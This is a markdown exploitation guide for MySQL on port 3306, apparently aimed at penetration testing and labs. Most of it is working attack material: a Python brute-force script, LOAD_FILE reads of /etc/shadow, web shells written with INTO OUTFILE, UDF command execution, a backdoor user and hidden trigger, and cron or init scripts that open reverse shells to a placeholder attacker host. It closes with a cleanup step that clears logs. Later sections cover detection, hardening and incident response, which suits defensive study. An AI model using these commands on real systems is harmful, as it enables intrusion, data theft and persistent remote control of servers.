# 🔐 MySQL (Port 3306) - Exploitation Guide

## 🎯 Vulnerability Overview

**Service:** MySQL Database Server  
**Port:** 3306/tcp  
**Vulnerable Versions:** MySQL 5.0.x, especially 5.0.51a  
**Vulnerability Types:** Weak Authentication, Privilege Escalation, File Access  
**Severity:** High to Critical

### Common Vulnerabilities
- Default/weak root passwords
- Anonymous user access
- Privilege escalation via User Defined Functions (UDF)
- File system access via `LOAD_FILE()` and `INTO OUTFILE`
- Information disclosure through error messages

---

## 🔍 Reconnaissance Workflow

### Step 1: Service Detection

#### Port Scanning
```bash
# Quick MySQL port scan
nmap -p 3306 <target-ip>

# Service version detection
nmap -sV -p 3306 <target-ip>

# Comprehensive MySQL enumeration
nmap -sV -sC -p 3306 --script mysql-* <target-ip>
```

#### MySQL Version Detection
```bash
# Version banner grabbing
mysql -h <target-ip> -u root -e "SELECT VERSION();"

# Using nmap script
nmap --script mysql-info -p 3306 <target-ip>

# Telnet banner grab
echo "quit" | telnet <target-ip> 3306
```

### Step 2: Authentication Testing

#### Anonymous Access
```bash
# Test anonymous connection
mysql -h <target-ip>
mysql -h <target-ip> -u ""
mysql -h <target-ip> -u anonymous
```

#### Default Credentials
```bash
# Common MySQL default credentials
mysql -h <target-ip> -u root
mysql -h <target-ip> -u root -p
mysql -h <target-ip> -u root -proot
mysql -h <target-ip> -u root -pmysql
mysql -h <target-ip> -u root -padmin
mysql -h <target-ip> -u root -ppassword
mysql -h <target-ip> -u root -p123456

# Other common users
mysql -h <target-ip> -u admin -padmin
mysql -h <target-ip> -u mysql -pmysql
mysql -h <target-ip> -u user -puser
```

### Step 3: Database Enumeration

#### Basic Information Gathering
```sql
-- Version and system info
SELECT VERSION();
SELECT SYSTEM_USER();
SELECT USER();
SELECT CURRENT_USER();

-- Database listing
SHOW DATABASES;

-- User enumeration
SELECT user,host,password FROM mysql.user;
SELECT user,host,authentication_string FROM mysql.user;

-- Privilege enumeration
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
```

#### System Configuration
```sql
-- System variables
SHOW VARIABLES;
SHOW VARIABLES LIKE 'version%';
SHOW VARIABLES LIKE 'datadir%';
SHOW VARIABLES LIKE 'secure_file_priv%';

-- Process list
SHOW PROCESSLIST;

-- Status information
SHOW STATUS;
```

---

## 💥 Exploitation Workflow

### Method 1: Direct Database Access

#### Authentication Bypass
```bash
# If root has no password
mysql -h <target-ip> -u root

# Test for empty password
mysql -h <target-ip> -u root -p
# (Press Enter when prompted for password)

# Using MySQL client options
mysql -h <target-ip> -u root --password=""
```

#### Database Exploration
```sql
-- Show all databases
SHOW DATABASES;

-- Use specific database
USE mysql;
USE information_schema;

-- Show tables
SHOW TABLES;

-- Describe table structure
DESCRIBE user;
DESCRIBE mysql.user;

-- Extract sensitive data
SELECT user,host,password FROM mysql.user;
SELECT schema_name FROM information_schema.schemata;
```

### Method 2: Brute Force Attack

#### Using Hydra
```bash
# Single username brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt <target-ip> mysql

# Multiple usernames
hydra -L mysql_users.txt -P /usr/share/wordlists/rockyou.txt <target-ip> mysql

# Specific password list
hydra -l root -P mysql_passwords.txt <target-ip> mysql -t 4 -V
```

#### Using Metasploit
```bash
# MySQL login scanner
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target-ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE true
run
```

#### Custom Python Brute Force
```python
#!/usr/bin/env python3
import mysql.connector
import sys
from itertools import product

def mysql_brute_force(host, port, usernames, passwords):
    for username, password in product(usernames, passwords):
        try:
            print(f"Trying {username}:{password}", end=" ... ")
            
            connection = mysql.connector.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                connect_timeout=5
            )
            
            if connection.is_connected():
                print("SUCCESS!")
                cursor = connection.cursor()
                cursor.execute("SELECT VERSION();")
                version = cursor.fetchone()
                print(f"MySQL Version: {version[0]}")
                connection.close()
                return username, password
            
        except mysql.connector.Error:
            print("Failed")
            continue
        except Exception as e:
            print(f"Error: {e}")
            continue
    
    return None, None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 mysql_brute.py <target-ip>")
        sys.exit(1)
    
    target = sys.argv[1]
    port = 3306
    
    usernames = ['root', 'admin', 'mysql', 'user', '']
    passwords = ['', 'root', 'admin', 'mysql', 'password', '123456', 'toor']
    
    print(f"Starting MySQL brute force against {target}:{port}")
    username, password = mysql_brute_force(target, port, usernames, passwords)
    
    if username is not None:
        print(f"\n[+] Valid credentials found: {username}:{password}")
    else:
        print("\n[-] No valid credentials found")
```

### Method 3: File System Access

#### Reading System Files
```sql
-- Check file reading privileges
SELECT file_priv FROM mysql.user WHERE user = 'root';

-- Read system files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/etc/hosts');
SELECT LOAD_FILE('/proc/version');

-- Windows files
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
SELECT LOAD_FILE('C:\\Windows\\boot.ini');

-- MySQL configuration
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT LOAD_FILE('/etc/my.cnf');
```

#### Writing Files to System
```sql
-- Check secure_file_priv setting
SHOW VARIABLES LIKE 'secure_file_priv';

-- Write web shell (if web server present)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php eval($_POST["cmd"]); ?>' INTO OUTFILE '/tmp/backdoor.php';

-- Write SSH keys
SELECT 'ssh-rsa AAAAB3NzaC1yc2E... your-key' INTO OUTFILE '/home/user/.ssh/authorized_keys';

-- Write cron jobs
SELECT '* * * * * root nc attacker-ip 4444 -e /bin/bash' INTO OUTFILE '/etc/cron.d/backdoor';
```

### Method 4: User Defined Functions (UDF) Privilege Escalation

#### Check UDF Support
```sql
-- Check if UDFs are supported
SELECT * FROM mysql.func;

-- Check plugin directory
SHOW VARIABLES LIKE 'plugin_dir';

-- Check for existing UDFs
SELECT name,dl FROM mysql.func WHERE type='function';
```

#### MySQL 5.x UDF Exploitation
```sql
-- Create UDF for command execution (MySQL 5.x)
-- First, need to upload lib_mysqludf_sys.so to plugin directory

-- Using hex encoding to upload library
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';

-- Create UDF functions
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';

-- Execute commands
SELECT sys_exec('id > /tmp/mysql_output.txt');
SELECT sys_eval('whoami');
SELECT sys_exec('nc attacker-ip 4444 -e /bin/bash');
```

#### Metasploit UDF Exploitation
```bash
# Use Metasploit UDF exploit
use exploit/multi/mysql/mysql_udf_payload
set RHOSTS <target-ip>
set USERNAME root
set PASSWORD <password>
set LHOST <your-ip>
exploit
```

### Method 5: SQL Injection to System Access

#### Through Web Applications
```sql
-- Union-based injection to read files
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--

-- Write web shell via SQL injection
UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE '/var/www/html/cmd.php'--

-- Time-based command execution
SELECT BENCHMARK(1000000,MD5(1)) FROM dual WHERE SUBSTRING(LOAD_FILE('/etc/passwd'),1,1)='r'--
```

---

## ✅ Post-Exploitation Activities

### Database Assessment
```sql
-- List all databases
SHOW DATABASES;

-- For each database, examine tables
USE database_name;
SHOW TABLES;

-- Look for sensitive data
SELECT * FROM users;
SELECT * FROM accounts;
SELECT * FROM passwords;
SELECT * FROM admin;
SELECT * FROM config;

-- Search for tables containing passwords
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%pass%';
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user%';
SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%admin%';
```

### System Information Gathering
```sql
-- System information through MySQL
SELECT @@version_compile_os;
SELECT @@basedir;
SELECT @@datadir;
SELECT @@tmpdir;

-- Environment variables
SHOW VARIABLES LIKE 'hostname';
SHOW VARIABLES LIKE 'port';

-- Current working directory
SELECT @@basedir;

-- File system information
SELECT LOAD_FILE('/proc/cpuinfo');
SELECT LOAD_FILE('/proc/meminfo');
SELECT LOAD_FILE('/etc/issue');
```

### Data Extraction
```sql
-- Dump entire databases
mysqldump -h <target-ip> -u root -p<password> --all-databases > all_databases.sql

-- Specific database dump
mysqldump -h <target-ip> -u root -p<password> database_name > database.sql

-- Table-specific dumps
mysqldump -h <target-ip> -u root -p<password> database_name table_name > table.sql

-- Export to CSV
SELECT * FROM users INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATED BY ',' ENCLOSED BY '"';
```

### Persistence Establishment

#### Database-Level Persistence
```sql
-- Create backdoor user
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'SecurePass123';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- Create hidden stored procedure
DELIMITER $$
CREATE PROCEDURE hidden_backdoor()
BEGIN
    DECLARE cmd VARCHAR(255);
    SET cmd = 'nc attacker-ip 4444 -e /bin/bash';
    SET @sql = CONCAT('SELECT sys_exec(''', cmd, ''')');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END$$
DELIMITER ;

-- Create trigger for persistence
CREATE TRIGGER backdoor_trigger AFTER INSERT ON mysql.user FOR EACH ROW
    CALL hidden_backdoor();
```

#### System-Level Persistence
```sql
-- Write SSH keys
SELECT 'ssh-rsa AAAAB3NzaC1yc2E... your-public-key' INTO OUTFILE '/root/.ssh/authorized_keys';

-- Create cron job
SELECT '*/5 * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"' INTO OUTFILE '/etc/cron.d/mysql_backdoor';

-- Write startup script
SELECT '#!/bin/bash
nc attacker-ip 4444 -e /bin/bash' INTO OUTFILE '/etc/init.d/mysql-monitor';
```

---

## 🔧 Advanced Techniques

### MySQL Log Poisoning
```sql
-- Enable general query log
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/mysql.php';

-- Execute query with PHP code
SELECT '<?php system($_GET["cmd"]); ?>';

-- Access via web: http://target/mysql.php?cmd=id
```

### Memory Analysis
```sql
-- Check memory usage
SHOW STATUS LIKE 'memory%';

-- Process information
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;

-- Connection information
SHOW STATUS LIKE 'Conn%';
SHOW STATUS LIKE 'Thread%';
```

### Network Analysis
```sql
-- Show current connections
SHOW PROCESSLIST;

-- Connection statistics
SHOW STATUS LIKE 'Connections';
SHOW STATUS LIKE 'Max_used_connections';

-- User connection information
SELECT USER, HOST FROM INFORMATION_SCHEMA.PROCESSLIST;
```

---

## 🔍 Detection and Forensics

### Log Analysis
```bash
# MySQL error logs
tail -f /var/log/mysql/error.log
grep -i "failed login" /var/log/mysql/error.log

# MySQL query logs (if enabled)
tail -f /var/log/mysql/mysql.log
grep -i "load_file\|into outfile\|sys_exec" /var/log/mysql/mysql.log

# System authentication logs
grep -i "mysql" /var/log/auth.log
grep -i "3306" /var/log/auth.log
```

### Network Monitoring
```bash
# Monitor MySQL connections
netstat -an | grep :3306
lsof -i :3306

# Capture MySQL traffic
tcpdump -i any port 3306 -w mysql_traffic.pcap

# Analyze with tshark
tshark -f "port 3306" -V
```

### Database Forensics
```sql
-- Check user login history
SELECT USER, HOST, TIME FROM mysql.general_log WHERE COMMAND_TYPE = 'Connect';

-- Unusual query patterns
SELECT * FROM mysql.general_log WHERE SQL_TEXT LIKE '%LOAD_FILE%';
SELECT * FROM mysql.general_log WHERE SQL_TEXT LIKE '%INTO OUTFILE%';
SELECT * FROM mysql.general_log WHERE SQL_TEXT LIKE '%sys_exec%';

-- Recently created users
SELECT user, host, password_last_changed FROM mysql.user ORDER BY password_last_changed DESC;

-- UDF analysis
SELECT name, dl, type FROM mysql.func;
```

---

## 🛡️ Security Hardening

### MySQL Configuration Hardening
```bash
# Edit /etc/mysql/my.cnf or /etc/my.cnf
[mysqld]
# Bind to localhost only
bind-address = 127.0.0.1

# Disable remote root login
# Remove anonymous users
# Remove test database

# Disable dangerous functions
local-infile = 0
secure-file-priv = /var/lib/mysql-files/

# Enable SSL
ssl-ca = /etc/mysql/ssl/ca-cert.pem
ssl-cert = /etc/mysql/ssl/server-cert.pem
ssl-key = /etc/mysql/ssl/server-key.pem

# Logging
log-error = /var/log/mysql/error.log
general_log = 1
general_log_file = /var/log/mysql/mysql.log
```

### User and Privilege Management
```sql
-- Secure MySQL installation
mysql_secure_installation

-- Remove anonymous users
DELETE FROM mysql.user WHERE User='';

-- Remove remote root access
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');

-- Remove test database
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';

-- Create limited privilege users
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'SecurePassword123!';
GRANT SELECT, INSERT, UPDATE, DELETE ON app_database.* TO 'appuser'@'localhost';

-- Flush privileges
FLUSH PRIVILEGES;
```

### Firewall Configuration
```bash
# UFW configuration
ufw allow from 192.168.1.0/24 to any port 3306
ufw deny 3306

# iptables configuration
iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 3306 -j ACCEPT
iptables -A INPUT -p tcp --dport 3306 -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4
```

### Monitoring Setup
```bash
# MySQL monitoring script
cat > /usr/local/bin/mysql_monitor.sh << 'EOF'
#!/bin/bash
LOG_FILE="/var/log/mysql_security.log"

# Check for failed login attempts
FAILED_LOGINS=$(grep -c "Access denied" /var/log/mysql/error.log)
if [ $FAILED_LOGINS -gt 10 ]; then
    echo "$(date): ALERT - Multiple failed login attempts: $FAILED_LOGINS" >> $LOG_FILE
fi

# Check for dangerous queries
if [ -f /var/log/mysql/mysql.log ]; then
    grep -i "load_file\|into outfile\|sys_exec" /var/log/mysql/mysql.log >> $LOG_FILE
fi

# Check for new UDFs
mysql -e "SELECT COUNT(*) FROM mysql.func;" | tail -1 > /tmp/udf_count
if [ -f /tmp/udf_count_old ] && [ $(cat /tmp/udf_count) -gt $(cat /tmp/udf_count_old) ]; then
    echo "$(date): ALERT - New UDF detected" >> $LOG_FILE
fi
mv /tmp/udf_count /tmp/udf_count_old
EOF

chmod +x /usr/local/bin/mysql_monitor.sh
echo "*/5 * * * * root /usr/local/bin/mysql_monitor.sh" >> /etc/crontab
```

---

## 📚 References and Tools

### Essential Tools
- **MySQL Client:** Command-line MySQL client
- **Hydra:** Password brute forcing tool
- **Metasploit:** Penetration testing framework
- **mysqldump:** Database backup utility
- **Nmap:** Network scanner with MySQL scripts
- **sqlmap:** SQL injection testing tool

### MySQL-Specific Nmap Scripts
```bash
# Available MySQL scripts
ls /usr/share/nmap/scripts/ | grep mysql

# Key scripts:
mysql-audit.nse         # MySQL security audit
mysql-brute.nse         # Brute force authentication
mysql-databases.nse     # List databases
mysql-dump-hashes.nse   # Dump password hashes
mysql-empty-password.nse # Check for empty passwords
mysql-enum.nse          # General enumeration
mysql-info.nse          # Version information
mysql-query.nse         # Execute custom queries
mysql-users.nse         # Enumerate users
mysql-variables.nse     # Show system variables
mysql-vuln-cve2012-2122.nse # Check for authentication bypass
```

### UDF Libraries
```bash
# lib_mysqludf_sys locations
/usr/lib/mysql/plugin/
/usr/lib64/mysql/plugin/
/usr/lib/x86_64-linux-gnu/mariadb18/plugin/

# Download UDF library
wget https://github.com/mysqludf/lib_mysqludf_sys/releases/download/lib_mysqludf_sys-1.0.4/lib_mysqludf_sys-1.0.4.tar.gz
```

### Common MySQL Wordlists
```bash
# Default users
root
mysql
admin
administrator
user
guest
test

# Default passwords
(empty)
root
mysql
admin
password
123456
toor
pass
test
```

### Online Resources
- **MySQL Security Guide:** https://dev.mysql.com/doc/refman/8.0/en/security.html
- **OWASP MySQL Security:** https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html
- **CVE Database:** https://cve.mitre.org/
- **MySQL UDF Repository:** https://github.com/mysqludf/lib_mysqludf_sys

---

## ⚠️ Legal and Ethical Considerations

**WARNING:** This guide is for educational and authorized security testing purposes only.

### Important Guidelines:
- Always obtain proper written authorization before testing
- Only test systems you own or have explicit permission to test
- Database attacks can cause data loss or corruption
- Document all activities for reporting purposes
- Follow responsible disclosure practices
- Comply with local laws and regulations

### Best Practices:
- Use read-only queries when possible during reconnaissance
- Avoid modifying production data
- Limit brute force attempts to prevent account lockouts
- Monitor system resources during testing
- Clean up any files or changes made during testing
- Report vulnerabilities through proper channels

### Cleanup Checklist:
```sql
-- Remove created users
DROP USER IF EXISTS 'backdoor'@'%';
DROP USER IF EXISTS 'test'@'%';

-- Remove UDFs
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;

-- Remove triggers and procedures
DROP TRIGGER IF EXISTS backdoor_trigger;
DROP PROCEDURE IF EXISTS hidden_backdoor;

-- Clean up files
-- Remove any files written via INTO OUTFILE
```

```bash
# System cleanup
rm -f /tmp/mysql_output.txt
rm -f /var/www/html/shell.php
rm -f /etc/cron.d/mysql_backdoor
rm -f /tmp/*.sql

# Clear MySQL logs (if necessary and authorized)
> /var/log/mysql/mysql.log
```

---

## 🚨 Incident Response

### Immediate Response Actions
```bash
# Stop MySQL service
systemctl stop mysql
systemctl stop mysqld

# Block MySQL port
iptables -I INPUT 1 -p tcp --dport 3306 -j DROP

# Kill existing connections
ss -K dst :3306

# Check for malicious files
find /var/www/html -name "*.php" -newer /var/log/lastlog
find /tmp -name "*.sql" -newer /var/log/lastlog
```

### Damage Assessment
```sql
-- Check for unauthorized users
SELECT user, host, authentication_string FROM mysql.user;

-- Look for suspicious UDFs
SELECT * FROM mysql.func;

-- Check recent queries (if logging enabled)
SELECT * FROM mysql.general_log WHERE event_time > DATE_SUB(NOW(), INTERVAL 24 HOUR);

-- Verify database integrity
CHECK TABLE mysql.user;
CHECK TABLE mysql.db;
```

### Recovery Actions
```sql
-- Reset root password
ALTER USER 'root'@'localhost' IDENTIFIED BY 'NewSecurePassword123!';

-- Remove unauthorized users
DROP USER 'suspicious_user'@'%';

-- Reset privileges
FLUSH PRIVILEGES;

-- Restore from backup if necessary
-- mysql < backup.sql
```

---

## 🔬 Advanced Research Topics

### MySQL Version-Specific Vulnerabilities

#### MySQL 5.0.x Specific Issues
- Authentication bypass (CVE-2012-2122)
- Privilege escalation via UDF
- Information disclosure through error messages

#### MySQL 5.1.x - 5.5.x Issues  
- SSL certificate validation bypass
- MyISAM arbitrary code execution
- Geometry query DoS

#### Modern MySQL Versions
- JSON function vulnerabilities
- X Plugin authentication bypass
- Keyring plugin issues

### Research Commands
```sql
-- Version-specific function testing
SELECT @@version;
SELECT @@version_comment;
SELECT @@version_compile_machine;
SELECT @@version_compile_os;

-- Plugin enumeration
SELECT * FROM INFORMATION_SCHEMA.PLUGINS;
SHOW PLUGINS;

-- Storage engine analysis
SHOW ENGINES;
SELECT * FROM INFORMATION_SCHEMA.ENGINES;
```

---

*Last Updated: August 2025*  
*Version: 1.0*